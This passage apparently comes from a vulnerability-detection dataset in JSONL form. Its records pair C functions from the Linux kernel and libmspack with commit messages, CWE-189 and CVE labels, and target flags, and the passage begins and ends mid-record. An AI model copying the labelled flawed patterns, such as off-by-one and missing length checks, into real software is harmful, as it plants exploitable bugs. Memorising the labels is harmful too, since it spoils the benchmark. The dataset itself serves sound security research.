f_offset);\n\t\t\t\tbreak;\n\t\t\tdefault:\n\t\t\t\t/* hmm, too complex filter, give up with jit compiler */\n\t\t\t\tgoto out;\n\t\t\t}\n\t\t\tilen = prog - temp;\n\t\t\tif (image) {\n\t\t\t\tif (unlikely(proglen + ilen > oldproglen)) {\n\t\t\t\t\tpr_err(\"bpb_jit_compile fatal error\\n\");\n\t\t\t\t\tkfree(addrs);\n\t\t\t\t\tmodule_free(NULL, image);\n\t\t\t\t\treturn;\n\t\t\t\t}\n\t\t\t\tmemcpy(image + proglen, temp, ilen);\n\t\t\t}\n\t\t\tproglen += ilen;\n\t\t\taddrs[i] = proglen;\n\t\t\tprog = temp;\n\t\t}\n\t\t/* last bpf instruction is always a RET :\n\t\t * use it to give the cleanup instruction(s) addr\n\t\t */\n\t\tcleanup_addr = proglen - 1; /* ret */\n\t\tif (seen)\n\t\t\tcleanup_addr -= 1; /* leaveq */\n\t\tif (seen & SEEN_XREG)\n\t\t\tcleanup_addr -= 4; /* mov  -8(%rbp),%rbx */\n\n\t\tif (image) {\n\t\t\tWARN_ON(proglen != oldproglen);\n\t\t\tbreak;\n\t\t}\n\t\tif (proglen == oldproglen) {\n\t\t\timage = module_alloc(max_t(unsigned int,\n\t\t\t\t\t\t   proglen,\n\t\t\t\t\t\t   sizeof(struct work_struct)));\n\t\t\tif (!image)\n\t\t\t\tgoto out;\n\t\t}\n\t\toldproglen = proglen;\n\t}\n\tif (bpf_jit_enable > 1)\n\t\tpr_err(\"flen=%d proglen=%u pass=%d image=%p\\n\",\n\t\t       flen, proglen, pass, image);\n\n\tif (image) {\n\t\tif (bpf_jit_enable > 1)\n\t\t\tprint_hex_dump(KERN_ERR, \"JIT code: \", DUMP_PREFIX_ADDRESS,\n\t\t\t\t       16, 1, image, proglen, false);\n\n\t\tbpf_flush_icache(image, image + proglen);\n\n\t\tfp->bpf_func = (void *)image;\n\t}\nout:\n\tkfree(addrs);\n\treturn;\n}\n", "func_hash": 67387289507214147014158093367984081971, "file_name": "bpf_jit_comp.c", "file_hash": 114327817519201563092074124098250767576, "cwe": ["CWE-189"], "cve": "CVE-2014-2889", "cve_desc": "Off-by-one error in the bpf_jit_compile function in arch/x86/net/bpf_jit_comp.c in the Linux kernel before 3.1.8, when BPF JIT is enabled, allows local users to cause a denial of service (system crash) or possibly gain privileges via a long jump after a conditional jump.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2014-2889"}
{"idx": 159179, "project": "libmspack", "commit_id": "18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "project_url": "https://github.com/kyz/libmspack", "commit_url": "https://github.com/kyz/libmspack/commit/18b6a2cc0b87536015bedd4f7763e6b02d5aa4f3", "commit_message": "Prevent a 1-byte underread of the input buffer if an odd-sized data block comes just before an uncompressed block header", "target": 0, "func": "int lzxd_decompress(struct lzxd_stream *lzx, off_t out_bytes) {\n  /* bitstream and huffman reading variables */\n  register unsigned int bit_buffer;\n  register int bits_left, i=0;\n  unsigned char *i_ptr, *i_end;\n  register unsigned short sym;\n\n  int match_length, length_footer, extra, verbatim_bits, bytes_todo;\n  int this_run, main_element, aligned_bits, j;\n  unsigned char *window, *runsrc, *rundest, buf[12];\n  unsigned int frame_size=0, end_frame, match_offset, window_posn;\n  unsigned int R0, R1, R2;\n\n  /* easy answers */\n  if (!lzx || (out_bytes < 0)) return MSPACK_ERR_ARGS;\n  if (lzx->error) return lzx->error;\n\n  /* flush out any stored-up bytes before we begin */\n  i = lzx->o_end - lzx->o_ptr;\n  if ((off_t) i > out_bytes) i = (int) out_bytes;\n  if (i) {\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n  }\n  if (out_bytes == 0) return MSPACK_ERR_OK;\n\n  /* restore local state */\n  RESTORE_BITS;\n  window = lzx->window;\n  window_posn = lzx->window_posn;\n  R0 = lzx->R0;\n  R1 = lzx->R1;\n  R2 = lzx->R2;\n\n  end_frame = (unsigned int)((lzx->offset + out_bytes) / LZX_FRAME_SIZE) + 1;\n\n  while (lzx->frame < end_frame) {\n    /* have we reached the reset interval? (if there is one?) */\n    if (lzx->reset_interval && ((lzx->frame % lzx->reset_interval) == 0)) {\n      if (lzx->block_remaining) {\n\tD((\"%d bytes remaining at reset interval\", lzx->block_remaining))\n\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n      }\n\n      /* re-read the intel header and reset the huffman lengths */\n      lzxd_reset_state(lzx);\n      R0 = lzx->R0;\n      R1 = lzx->R1;\n      R2 = lzx->R2;\n    }\n\n    /* LZX DELTA format has chunk_size, not present in LZX format */\n    if (lzx->is_delta) {\n      ENSURE_BITS(16);\n      REMOVE_BITS(16);\n    }\n\n    /* read header if necessary */\n    if (!lzx->header_read) {\n      /* read 1 bit. if bit=0, intel filesize = 0.\n       * if bit=1, read intel filesize (32 bits) */\n      j = 0; READ_BITS(i, 1); if (i) { READ_BITS(i, 16); READ_BITS(j, 16); }\n      lzx->intel_filesize = (i << 16) | j;\n      lzx->header_read = 1;\n    } \n\n    /* calculate size of frame: all frames are 32k except the final frame\n     * which is 32kb or less. this can only be calculated when lzx->length\n     * has been filled in. */\n    frame_size = LZX_FRAME_SIZE;\n    if (lzx->length && (lzx->length - lzx->offset) < (off_t)frame_size) {\n      frame_size = lzx->length - lzx->offset;\n    }\n\n    /* decode until one more frame is available */\n    bytes_todo = lzx->frame_posn + frame_size - window_posn;\n    while (bytes_todo > 0) {\n      /* initialise new block, if one is needed */\n      if (lzx->block_remaining == 0) {\n\t/* realign if previous block was an odd-sized UNCOMPRESSED block */\n\tif ((lzx->block_type == LZX_BLOCKTYPE_UNCOMPRESSED) &&\n\t    (lzx->block_length & 1))\n\t{\n\t  READ_IF_NEEDED;\n\t  i_ptr++;\n\t}\n\n\t/* read block type (3 bits) and block length (24 bits) */\n\tREAD_BITS(lzx->block_type, 3);\n\tREAD_BITS(i, 16); READ_BITS(j, 8);\n\tlzx->block_remaining = lzx->block_length = (i << 8) | j;\n\t/*D((\"new block t%d len %u\", lzx->block_type, lzx->block_length))*/\n\n\t/* read individual block headers */\n\tswitch (lzx->block_type) {\n\tcase LZX_BLOCKTYPE_ALIGNED:\n\t  /* read lengths of and build aligned huffman decoding tree */\n\t  for (i = 0; i < 8; i++) { READ_BITS(j, 3); lzx->ALIGNED_len[i] = j; }\n\t  BUILD_TABLE(ALIGNED);\n\t  /* no break -- rest of aligned header is same as verbatim */\n\tcase LZX_BLOCKTYPE_VERBATIM:\n\t  /* read lengths of and build main huffman decoding tree */\n\t  READ_LENGTHS(MAINTREE, 0, 256);\n\t  READ_LENGTHS(MAINTREE, 256, LZX_NUM_CHARS + lzx->num_offsets);\n\t  BUILD_TABLE(MAINTREE);\n\t  /* if the literal 0xE8 is anywhere in the block... */\n\t  if (lzx->MAINTREE_len[0xE8] != 0) lzx->intel_started = 1;\n\t  /* read lengths of and build lengths huffman decoding tree */\n\t  READ_LENGTHS(LENGTH, 0, LZX_NUM_SECONDARY_LENGTHS);\n\t  BUILD_TABLE_MAYBE_EMPTY(LENGTH);\n\t  break;\n\n\tcase LZX_BLOCKTYPE_UNCOMPRESSED:\n\t  /* because we can't assume otherwise */\n \t  lzx->intel_started = 1;\n \n \t  /* read 1-16 (not 0-15) bits to align to bytes */\n\t  if (bits_left == 0) ENSURE_BITS(16);\n \t  bits_left = 0; bit_buffer = 0;\n \n \t  /* read 12 bytes of stored R0 / R1 / R2 values */\n\t  for (rundest = &buf[0], i = 0; i < 12; i++) {\n\t    READ_IF_NEEDED;\n\t    *rundest++ = *i_ptr++;\n\t  }\n\t  R0 = buf[0] | (buf[1] << 8) | (buf[2]  << 16) | (buf[3]  << 24);\n\t  R1 = buf[4] | (buf[5] << 8) | (buf[6]  << 16) | (buf[7]  << 24);\n\t  R2 = buf[8] | (buf[9] << 8) | (buf[10] << 16) | (buf[11] << 24);\n\t  break;\n\n\tdefault:\n\t  D((\"bad block type\"))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n      }\n\n      /* decode more of the block:\n       * run = min(what's available, what's needed) */\n      this_run = lzx->block_remaining;\n      if (this_run > bytes_todo) this_run = bytes_todo;\n\n      /* assume we decode exactly this_run bytes, for now */\n      bytes_todo           -= this_run;\n      lzx->block_remaining -= this_run;\n\n      /* decode at least this_run bytes */\n      switch (lzx->block_type) {\n      case LZX_BLOCKTYPE_VERBATIM:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n\t      if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              }\n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                                  break;\n\t    case 1: match_offset = R1; R1=R0;        R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2=R0;        R0 = match_offset; break;\n\t    case 3: match_offset = 1;  R2=R1; R1=R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      READ_BITS(verbatim_bits, extra);\n\t      match_offset = position_base[match_offset] - 2 + verbatim_bits;\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\t    \n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_ALIGNED:\n\twhile (this_run > 0) {\n\t  READ_HUFFSYM(MAINTREE, main_element);\n\t  if (main_element < LZX_NUM_CHARS) {\n\t    /* literal: 0 to LZX_NUM_CHARS-1 */\n\t    window[window_posn++] = main_element;\n\t    this_run--;\n\t  }\n\t  else {\n\t    /* match: LZX_NUM_CHARS + ((slot<<3) | length_header (3 bits)) */\n\t    main_element -= LZX_NUM_CHARS;\n\n\t    /* get match length */\n\t    match_length = main_element & LZX_NUM_PRIMARY_LENGTHS;\n\t    if (match_length == LZX_NUM_PRIMARY_LENGTHS) {\n              if (lzx->LENGTH_empty) {\n                D((\"LENGTH symbol needed but tree is empty\"))\n                return lzx->error = MSPACK_ERR_DECRUNCH;\n              } \n\t      READ_HUFFSYM(LENGTH, length_footer);\n\t      match_length += length_footer;\n\t    }\n\t    match_length += LZX_MIN_MATCH;\n\n\t    /* get match offset */\n\t    switch ((match_offset = (main_element >> 3))) {\n\t    case 0: match_offset = R0;                             break;\n\t    case 1: match_offset = R1; R1 = R0; R0 = match_offset; break;\n\t    case 2: match_offset = R2; R2 = R0; R0 = match_offset; break;\n\t    default:\n\t      extra = (match_offset >= 36) ? 17 : extra_bits[match_offset];\n\t      match_offset = position_base[match_offset] - 2;\n\t      if (extra > 3) {\n\t\t/* verbatim and aligned bits */\n\t\textra -= 3;\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += (verbatim_bits << 3);\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra == 3) {\n\t\t/* aligned bits only */\n\t\tREAD_HUFFSYM(ALIGNED, aligned_bits);\n\t\tmatch_offset += aligned_bits;\n\t      }\n\t      else if (extra > 0) { /* extra==1, extra==2 */\n\t\t/* verbatim bits only */\n\t\tREAD_BITS(verbatim_bits, extra);\n\t\tmatch_offset += verbatim_bits;\n\t      }\n\t      else /* extra == 0 */ {\n\t\t/* ??? not defined in LZX specification! */\n\t\tmatch_offset = 1;\n\t      }\n\t      /* update repeated offset LRU queue */\n\t      R2 = R1; R1 = R0; R0 = match_offset;\n\t    }\n\n\t    /* LZX DELTA uses max match length to signal even longer match */\n\t    if (match_length == LZX_MAX_MATCH && lzx->is_delta) {\n\t\tint extra_len = 0;\n\t\tENSURE_BITS(3); /* 4 entry huffman tree */\n\t\tif (PEEK_BITS(1) == 0) {\n\t\t    REMOVE_BITS(1); /* '0' -> 8 extra length bits */\n\t\t    READ_BITS(extra_len, 8);\n\t\t}\n\t\telse if (PEEK_BITS(2) == 2) {\n\t\t    REMOVE_BITS(2); /* '10' -> 10 extra length bits + 0x100 */\n\t\t    READ_BITS(extra_len, 10);\n\t\t    extra_len += 0x100;\n\t\t}\n\t\telse if (PEEK_BITS(3) == 6) {\n\t\t    REMOVE_BITS(3); /* '110' -> 12 extra length bits + 0x500 */\n\t\t    READ_BITS(extra_len, 12);\n\t\t    extra_len += 0x500;\n\t\t}\n\t\telse {\n\t\t    REMOVE_BITS(3); /* '111' -> 15 extra length bits */\n\t\t    READ_BITS(extra_len, 15);\n\t\t}\n\t\tmatch_length += extra_len;\n\t    }\n\n\t    if ((window_posn + match_length) > lzx->window_size) {\n\t      D((\"match ran over window wrap\"))\n\t      return lzx->error = MSPACK_ERR_DECRUNCH;\n\t    }\n\n\t    /* copy match */\n\t    rundest = &window[window_posn];\n\t    i = match_length;\n\t    /* does match offset wrap the window? */\n\t    if (match_offset > window_posn) {\n\t      if (match_offset > lzx->offset &&\n\t\t  (match_offset - window_posn) > lzx->ref_data_size)\n\t      {\n\t\tD((\"match offset beyond LZX stream\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      /* j = length from match offset to end of window */\n\t      j = match_offset - window_posn;\n\t      if (j > (int) lzx->window_size) {\n\t\tD((\"match offset beyond window boundaries\"))\n\t\treturn lzx->error = MSPACK_ERR_DECRUNCH;\n\t      }\n\t      runsrc = &window[lzx->window_size - j];\n\t      if (j < i) {\n\t\t/* if match goes over the window edge, do two copy runs */\n\t\ti -= j; while (j-- > 0) *rundest++ = *runsrc++;\n\t\trunsrc = window;\n\t      }\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\t    else {\n\t      runsrc = rundest - match_offset;\n\t      while (i-- > 0) *rundest++ = *runsrc++;\n\t    }\n\n\t    this_run    -= match_length;\n\t    window_posn += match_length;\n\t  }\n\t} /* while (this_run > 0) */\n\tbreak;\n\n      case LZX_BLOCKTYPE_UNCOMPRESSED:\n\t/* as this_run is limited not to wrap a frame, this also means it\n\t * won't wrap the window (as the window is a multiple of 32k) */\n\trundest = &window[window_posn];\n\twindow_posn += this_run;\n\twhile (this_run > 0) {\n\t  if ((i = i_end - i_ptr) == 0) {\n\t    READ_IF_NEEDED;\n\t  }\n\t  else {\n\t    if (i > this_run) i = this_run;\n\t    lzx->sys->copy(i_ptr, rundest, (size_t) i);\n\t    rundest  += i;\n\t    i_ptr    += i;\n\t    this_run -= i;\n\t  }\n\t}\n\tbreak;\n\n      default:\n\treturn lzx->error = MSPACK_ERR_DECRUNCH; /* might as well */\n      }\n\n      /* did the final match overrun our desired this_run length? */\n      if (this_run < 0) {\n\tif ((unsigned int)(-this_run) > lzx->block_remaining) {\n\t  D((\"overrun went past end of block by %d (%d remaining)\",\n\t     -this_run, lzx->block_remaining ))\n\t  return lzx->error = MSPACK_ERR_DECRUNCH;\n\t}\n\tlzx->block_remaining -= -this_run;\n      }\n    } /* while (bytes_todo > 0) */\n\n    /* streams don't extend over frame boundaries */\n    if ((window_posn - lzx->frame_posn) != frame_size) {\n      D((\"decode beyond output frame limits! %d != %d\",\n\t window_posn - lzx->frame_posn, frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* re-align input bitstream */\n    if (bits_left > 0) ENSURE_BITS(16);\n    if (bits_left & 15) REMOVE_BITS(bits_left & 15);\n\n    /* check that we've used all of the previous frame first */\n    if (lzx->o_ptr != lzx->o_end) {\n      D((\"%ld avail bytes, new %d frame\",\n          (long)(lzx->o_end - lzx->o_ptr), frame_size))\n      return lzx->error = MSPACK_ERR_DECRUNCH;\n    }\n\n    /* does this intel block _really_ need decoding? */\n    if (lzx->intel_started && lzx->intel_filesize &&\n\t(lzx->frame <= 32768) && (frame_size > 10))\n    {\n      unsigned char *data    = &lzx->e8_buf[0];\n      unsigned char *dataend = &lzx->e8_buf[frame_size - 10];\n      signed int curpos      = lzx->intel_curpos;\n      signed int filesize    = lzx->intel_filesize;\n      signed int abs_off, rel_off;\n\n      /* copy e8 block to the e8 buffer and tweak if needed */\n      lzx->o_ptr = data;\n      lzx->sys->copy(&lzx->window[lzx->frame_posn], data, frame_size);\n\n      while (data < dataend) {\n\tif (*data++ != 0xE8) { curpos++; continue; }\n\tabs_off = data[0] | (data[1]<<8) | (data[2]<<16) | (data[3]<<24);\n\tif ((abs_off >= -curpos) && (abs_off < filesize)) {\n\t  rel_off = (abs_off >= 0) ? abs_off - curpos : abs_off + filesize;\n\t  data[0] = (unsigned char) rel_off;\n\t  data[1] = (unsigned char) (rel_off >> 8);\n\t  data[2] = (unsigned char) (rel_off >> 16);\n\t  data[3] = (unsigned char) (rel_off >> 24);\n\t}\n\tdata += 4;\n\tcurpos += 5;\n      }\n      lzx->intel_curpos += frame_size;\n    }\n    else {\n      lzx->o_ptr = &lzx->window[lzx->frame_posn];\n      if (lzx->intel_filesize) lzx->intel_curpos += frame_size;\n    }\n    lzx->o_end = &lzx->o_ptr[frame_size];\n\n    /* write a frame */\n    i = (out_bytes < (off_t)frame_size) ? (unsigned int)out_bytes : frame_size;\n    if (lzx->sys->write(lzx->output, lzx->o_ptr, i) != i) {\n      return lzx->error = MSPACK_ERR_WRITE;\n    }\n    lzx->o_ptr  += i;\n    lzx->offset += i;\n    out_bytes   -= i;\n\n    /* advance frame start position */\n    lzx->frame_posn += frame_size;\n    lzx->frame++;\n\n    /* wrap window / frame position pointers */\n    if (window_posn == lzx->window_size)     window_posn = 0;\n    if (lzx->frame_posn == lzx->window_size) lzx->frame_posn = 0;\n\n  } /* while (lzx->frame < end_frame) */\n\n  if (out_bytes) {\n    D((\"bytes left to output\"))\n    return lzx->error = MSPACK_ERR_DECRUNCH;\n  }\n\n  /* store local state */\n  STORE_BITS;\n  lzx->window_posn = window_posn;\n  lzx->R0 = R0;\n  lzx->R1 = R1;\n  lzx->R2 = R2;\n\n  return MSPACK_ERR_OK;\n}\n", "func_hash": 38707763100156244328506103789635435471, "file_name": "lzxd.c", "file_hash": 195696769726294100414401643560402095459, "cwe": ["CWE-189"], "cve": "CVE-2015-4471", "cve_desc": "Off-by-one error in the lzxd_decompress function in lzxd.c in libmspack before 0.5 allows remote attackers to cause a denial of service (buffer under-read and application crash) via a crafted CAB archive.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2015-4471"}
{"idx": 159180, "project": "linux", "commit_id": "23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "project_url": "https://github.com/torvalds/linux", "commit_url": "https://github.com/torvalds/linux/commit/23b133bdc452aa441fcb9b82cbf6dd05cfd342d0", "commit_message": "udf: Check length of extended attributes and allocation descriptors\n\nCheck length of extended attributes and allocation descriptors when\nloading inodes from disk. Otherwise corrupted filesystems could confuse\nthe code and make the kernel oops.\n\nReported-by: Carl Henrik Lunde <chlunde@ping.uio.no>\nCC: stable@vger.kernel.org\nSigned-off-by: Jan Kara <jack@suse.cz>", "target": 0, "func": "static int udf_read_inode(struct inode *inode, bool hidden_inode)\n{\n\tstruct buffer_head *bh = NULL;\n\tstruct fileEntry *fe;\n\tstruct extendedFileEntry *efe;\n\tuint16_t ident;\n\tstruct udf_inode_info *iinfo = UDF_I(inode);\n\tstruct udf_sb_info *sbi = UDF_SB(inode->i_sb);\n\tstruct kernel_lb_addr *iloc = &iinfo->i_location;\n\tunsigned int link_count;\n\tunsigned int indirections = 0;\n\tint bs = inode->i_sb->s_blocksize;\n\tint ret = -EIO;\n\nreread:\n\tif (iloc->logicalBlockNum >=\n\t    sbi->s_partmaps[iloc->partitionReferenceNum].s_partition_len) {\n\t\tudf_debug(\"block=%d, partition=%d out of range\\n\",\n\t\t\t  iloc->logicalBlockNum, iloc->partitionReferenceNum);\n\t\treturn -EIO;\n\t}\n\n\t/*\n\t * Set defaults, but the inode is still incomplete!\n\t * Note: get_new_inode() sets the following on a new inode:\n\t *      i_sb = sb\n\t *      i_no = ino\n\t *      i_flags = sb->s_flags\n\t *      i_state = 0\n\t * clean_inode(): zero fills and sets\n\t *      i_count = 1\n\t *      i_nlink = 1\n\t *      i_op = NULL;\n\t */\n\tbh = udf_read_ptagged(inode->i_sb, iloc, 0, &ident);\n\tif (!bh) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed !bh\\n\", inode->i_ino);\n\t\treturn -EIO;\n\t}\n\n\tif (ident != TAG_IDENT_FE && ident != TAG_IDENT_EFE &&\n\t    ident != TAG_IDENT_USE) {\n\t\tudf_err(inode->i_sb, \"(ino %ld) failed ident=%d\\n\",\n\t\t\tinode->i_ino, ident);\n\t\tgoto out;\n\t}\n\n\tfe = (struct fileEntry *)bh->b_data;\n\tefe = (struct extendedFileEntry *)bh->b_data;\n\n\tif (fe->icbTag.strategyType == cpu_to_le16(4096)) {\n\t\tstruct buffer_head *ibh;\n\n\t\tibh = udf_read_ptagged(inode->i_sb, iloc, 1, &ident);\n\t\tif (ident == TAG_IDENT_IE && ibh) {\n\t\t\tstruct kernel_lb_addr loc;\n\t\t\tstruct indirectEntry *ie;\n\n\t\t\tie = (struct indirectEntry *)ibh->b_data;\n\t\t\tloc = lelb_to_cpu(ie->indirectICB.extLocation);\n\n\t\t\tif (ie->indirectICB.extLength) {\n\t\t\t\tbrelse(ibh);\n\t\t\t\tmemcpy(&iinfo->i_location, &loc,\n\t\t\t\t       sizeof(struct kernel_lb_addr));\n\t\t\t\tif (++indirections > UDF_MAX_ICB_NESTING) {\n\t\t\t\t\tudf_err(inode->i_sb,\n\t\t\t\t\t\t\"too many ICBs in ICB hierarchy\"\n\t\t\t\t\t\t\" (max %d supported)\\n\",\n\t\t\t\t\t\tUDF_MAX_ICB_NESTING);\n\t\t\t\t\tgoto out;\n\t\t\t\t}\n\t\t\t\tbrelse(bh);\n\t\t\t\tgoto reread;\n\t\t\t}\n\t\t}\n\t\tbrelse(ibh);\n\t} else if (fe->icbTag.strategyType != cpu_to_le16(4)) {\n\t\tudf_err(inode->i_sb, \"unsupported strategy type: %d\\n\",\n\t\t\tle16_to_cpu(fe->icbTag.strategyType));\n\t\tgoto out;\n\t}\n\tif (fe->icbTag.strategyType == cpu_to_le16(4))\n\t\tiinfo->i_strat4096 = 0;\n\telse /* if (fe->icbTag.strategyType == cpu_to_le16(4096)) */\n\t\tiinfo->i_strat4096 = 1;\n\n\tiinfo->i_alloc_type = le16_to_cpu(fe->icbTag.flags) &\n\t\t\t\t\t\t\tICBTAG_FLAG_AD_MASK;\n\tiinfo->i_unique = 0;\n\tiinfo->i_lenEAttr = 0;\n\tiinfo->i_lenExtents = 0;\n\tiinfo->i_lenAlloc = 0;\n\tiinfo->i_next_alloc_block = 0;\n\tiinfo->i_next_alloc_goal = 0;\n\tif (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_EFE)) {\n\t\tiinfo->i_efe = 1;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct extendedFileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct extendedFileEntry),\n\t\t       bs - sizeof(struct extendedFileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_FE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 0;\n\t\tret = udf_alloc_i_data(inode, bs - sizeof(struct fileEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct fileEntry),\n\t\t       bs - sizeof(struct fileEntry));\n\t} else if (fe->descTag.tagIdent == cpu_to_le16(TAG_IDENT_USE)) {\n\t\tiinfo->i_efe = 0;\n\t\tiinfo->i_use = 1;\n\t\tiinfo->i_lenAlloc = le32_to_cpu(\n\t\t\t\t((struct unallocSpaceEntry *)bh->b_data)->\n\t\t\t\t lengthAllocDescs);\n\t\tret = udf_alloc_i_data(inode, bs -\n\t\t\t\t\tsizeof(struct unallocSpaceEntry));\n\t\tif (ret)\n\t\t\tgoto out;\n\t\tmemcpy(iinfo->i_ext.i_data,\n\t\t       bh->b_data + sizeof(struct unallocSpaceEntry),\n\t\t       bs - sizeof(struct unallocSpaceEntry));\n\t\treturn 0;\n\t}\n\n\tret = -EIO;\n\tread_lock(&sbi->s_cred_lock);\n\ti_uid_write(inode, le32_to_cpu(fe->uid));\n\tif (!uid_valid(inode->i_uid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_UID_SET))\n\t\tinode->i_uid = UDF_SB(inode->i_sb)->s_uid;\n\n\ti_gid_write(inode, le32_to_cpu(fe->gid));\n\tif (!gid_valid(inode->i_gid) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_IGNORE) ||\n\t    UDF_QUERY_FLAG(inode->i_sb, UDF_FLAG_GID_SET))\n\t\tinode->i_gid = UDF_SB(inode->i_sb)->s_gid;\n\n\tif (fe->icbTag.fileType != ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_fmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_fmode;\n\telse if (fe->icbTag.fileType == ICBTAG_FILE_TYPE_DIRECTORY &&\n\t\t\tsbi->s_dmode != UDF_INVALID_MODE)\n\t\tinode->i_mode = sbi->s_dmode;\n\telse\n\t\tinode->i_mode = udf_convert_permissions(fe);\n\tinode->i_mode &= ~sbi->s_umask;\n\tread_unlock(&sbi->s_cred_lock);\n\n\tlink_count = le16_to_cpu(fe->fileLinkCount);\n\tif (!link_count) {\n\t\tif (!hidden_inode) {\n\t\t\tret = -ESTALE;\n\t\t\tgoto out;\n\t\t}\n\t\tlink_count = 1;\n\t}\n\tset_nlink(inode, link_count);\n\n\tinode->i_size = le64_to_cpu(fe->informationLength);\n\tiinfo->i_lenExtents = inode->i_size;\n\n\tif (iinfo->i_efe == 0) {\n\t\tinode->i_blocks = le64_to_cpu(fe->logicalBlocksRecorded) <<\n\t\t\t(inode->i_sb->s_blocksize_bits - 9);\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_atime, fe->accessTime))\n\t\t\tinode->i_atime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_mtime,\n\t\t\t\t\t    fe->modificationTime))\n\t\t\tinode->i_mtime = sbi->s_record_time;\n\n\t\tif (!udf_disk_stamp_to_time(&inode->i_ctime, fe->attrTime))\n\t\t\tinode->i_ctime = sbi->s_record_time;\n\n\t\tiinfo->i_unique = le64_to_cpu(fe->uniqueID);\n\t\tiinfo->i_lenEAttr = 